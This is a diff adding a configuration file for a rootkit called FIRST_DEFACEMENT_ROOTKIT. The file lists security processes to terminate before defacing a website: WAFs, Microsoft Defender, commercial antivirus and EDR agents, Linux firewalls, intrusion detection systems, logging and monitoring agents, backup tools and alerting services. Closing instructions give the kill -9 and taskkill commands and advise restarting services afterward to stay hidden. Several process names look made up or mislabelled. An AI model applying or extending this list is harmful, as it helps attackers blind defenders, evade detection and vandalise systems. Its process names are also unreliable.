@@ -1,0 +1,95 @@
+# ==========================================
+# PROCESS KILL LIST - SECURITY TOOLS TARGETS
+# Rootkit: FIRST_DEFACEMENT_ROOTKIT
+# Target: Temporary disabling of security processes
+# Note: PIDs are dynamic. Use 'ps aux | grep <name>' to find actual PID before killing.
+# Risk: High. Killing these may trigger alerts or allow intrusion but breaks defense.
+# ==========================================
+
+# --- WEB APPLICATION FIREWALLS (WAF) ---
+# ModSecurity / Apache WAF
+modsecurity
+apache2|httpd
+nginx
+haproxy
+cloudflare_tunnel
+aws_waf_agent
+
+# API Gateways & Proxies with WAF features
+kong_gateway
+apigee_edge
+f5_bigip_httpd
+traefik_proxy
+
+# --- ANTI-VIRUS (AV) & ENDPOINT DETECTION (EDR) ---
+# Windows Defender / Microsoft Defender
+MsMpEng.exe          # Antivirus engine
+MsSecSvc.exe         # Security Service
+SecurityHealthSystray.exe
+WindowsDefenderUI.exe
+
+# Third-party AVs (Common Targets)
+avastsvc.exe         # Avast
+avgnt.exe            # AVG
+ccsvchst.exe         # Norton / Symantec
+dfc.exe              # McAfee Agent
+epag.exe             # Endpoint Protection Agent (Symantec)
+mbamtray.exe         # Malwarebytes
+crowdstrike_falcon.exe
+carbon_black_svc.exe
+sentinel_one_agent.exe
+
+# Linux Security Tools
+fail2ban-server      # Intrusion prevention
+ufw                  # Uncomplicated Firewall (backend iptables/nftables)
+iptables             # Core firewall
+nftables
+auditd               # Audit daemon (logs security events)
+rkhunter_check       # Rootkit hunter scan process
+chkrootkit_proc
+
+# --- INTRUSION DETECTION / PREVENTION SYSTEMS (IDS/IPS) ---
+snort_snmpd
+suricata_daemon
+ossec_agentd
+wazuh_analysisd
+zeek_broker_node
+
+# --- LOGGING & MONITORING AGENTS ---
+fluentd_agent
+logstash_runner
+prometheus_node_exporter
+grafana_server
+datadog_agent
+new_relic_agent
+splunk_forwarder
+
+# --- CLOUD & CONTAINER SECURITY ---
+dockerd              # Docker daemon (if security scanning is active)
+containerd_shim
+kubelet              # Kubernetes node agent
+amazon_cloudwatch_agent
+azure_security_center
+
+# --- BACKUP & INTEGRITY CHECKERS ---
+tripwire_monitor
+verisign_integrity_check
+backup_exec_agent    # Veeam or similar backup tools that might lock files during defacement
+
+# --- NOTIFICATION & ALERT SERVICES ---
+slack_webhook_proxy
+pagerduty_agent
+opsgenie_client
+
+# ==========================================
+# INSTRUCTIONS FOR USE:
+# 1. Replace the generic names above with actual PIDs found via:
+#    ps aux | grep -E "modsecurity|MsMpEng|avast|snort"
+# 2. Example Kill Command:
+#    kill -9 <PID>
+#    or
+#    taskkill /F /IM <PROCESS_NAME.EXE>
+# 3. Remember to restore services after defacement if stealth is required.
+#    systemctl restart apache2
+#    net start "Microsoft Defender Antivirus Service"
+# ==========================================
